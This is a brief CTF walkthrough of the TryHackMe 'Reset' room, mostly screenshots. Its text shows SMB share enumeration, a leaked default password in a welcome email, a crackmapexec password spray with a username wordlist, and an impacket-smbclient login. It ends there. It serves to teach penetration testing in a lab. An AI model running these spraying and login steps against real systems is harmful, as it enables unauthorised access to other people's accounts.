### 28-Jan-24-Sun

[TryHackMe | Reset](https://tryhackme.com/room/resetui)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/61ea74ae-c24f-45ce-85b8-3d8bdc8bccb7)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/92883bea-ca72-4d71-89d7-52c694617a41)

```
smbclient -L \\\\HayStack.thm.corp\\
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d004d845-e589-4576-a16e-af9e216d2a9a)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/b2be8cca-9d7f-43c7-8a25-9ec44fdf90be)

```
Subject: Welcome to Reset - Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team
```

```
ResetMe123!
```

```
crackmapexec smb 10.10.138.145
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/05604de3-92e5-49cd-8bdc-9ae0a05a9842)

```
crackmapexec smb 10.10.138.145 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p 'ResetMe123!'
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/c39077ef-8d6e-4a92-af3e-7e3f9f117fb3)

```
impacket-smbclient thm.corp\root:'ResetMe123!'@10.10.138.145
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/18b6a3fa-556c-400d-b7e4-6709676ba924)

